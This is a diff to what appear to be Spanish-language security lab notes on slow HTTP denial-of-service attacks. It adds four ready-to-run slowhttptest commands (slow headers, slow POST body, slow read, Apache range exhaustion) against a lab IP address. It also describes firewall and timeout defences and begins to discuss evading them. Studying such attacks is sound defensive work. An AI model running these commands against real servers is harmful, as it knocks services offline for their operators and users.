@@ -153,7 +153,15 @@ Ataque ddos basado en el envío de cabeceras incompletas para reservar recursos 
 ```shell
 //cabeceras incompletas
 slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.48.142 -x 24 -p 3
-//
+
+//post body
+slowhttptest -c 1000 -B -g -o slowhttp -i 110 -r 200 -s 8192 -t FAKEVERB -u https://10.11.48.142 -x 10 -p 3
+
+//lectura lenta
+slowhttptest -c 1000 -X -g -o slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://10.11.48.142 -p 3
+
+//memoria (apache)
+slowhttptest -R -u http://10.11.48.142 -t HEAD -c 1000 -a 10 -b 3000 -r 500
 ```
 Para proteger contra este tipo de ataque en el mismo segmento, un firewall que detectara y filtrara el tráfico sospechoso, gran cantidad de peticiones saliendo de un mismo equipo con cabeceras incompletas y distintas direcciones. Para reducir el impacto de este tipo de ataques cuando provienen de fuera del segmento sería las restricciones del servicio para velocidades de descarga bajas y tiempos máximos de conexión.
 Para evitar estas protecciones en el caso del firewall 
